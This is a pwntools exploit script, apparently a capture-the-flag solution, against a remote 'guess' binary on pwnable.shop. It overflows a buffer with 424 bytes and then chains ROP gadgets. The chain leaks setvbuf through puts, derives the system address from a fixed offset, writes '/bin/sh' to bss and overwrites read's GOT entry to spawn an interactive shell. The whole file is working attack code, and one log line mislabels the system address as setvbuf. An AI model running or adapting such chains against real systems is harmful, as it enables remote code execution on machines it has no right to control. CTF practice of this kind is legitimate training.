from pwn import *

#p = process("./guess")
p = remote("pwnable.shop",10003)
e = ELF("./guess")

read_plt = 0x400540
setvbuf_got = 0x601038
puts_plt = 0x400520
read_got = 0x601028
pr = 0x400763
ppr = 0x400761
bss = e.bss()

log.info("Address of BSS : "+str(hex(bss)))

payload = 'A'*424

payload += p64(pr)
payload += p64(setvbuf_got)
payload += p64(puts_plt)

payload += p64(ppr)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)

payload += p64(ppr)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pr)
payload += p64(bss)
payload += p64(read_plt)
p.recvuntil("String!\n")
p.sendline(payload)

setvbuf_addr = u64(p.recv(6).strip().ljust(8,"\x00"))
log.info("Address of setvbuf : "+str(hex(setvbuf_addr)))

system_addr = setvbuf_addr - 0x31eb0
log.info("Address of setvbuf : "+str(hex(system_addr)))

p.send("/bin/sh\00")
sleep(0.5)
p.sendline(p64(system_addr))
sleep(0.5)
p.interactive()
